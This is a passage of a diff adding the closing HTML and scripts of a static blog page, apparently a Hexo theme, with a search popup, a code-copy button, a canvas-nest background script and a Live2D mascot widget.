+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"superSample":2,"width":170,"height":380,"position":"right","hOffset":50,"vOffset":-7},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
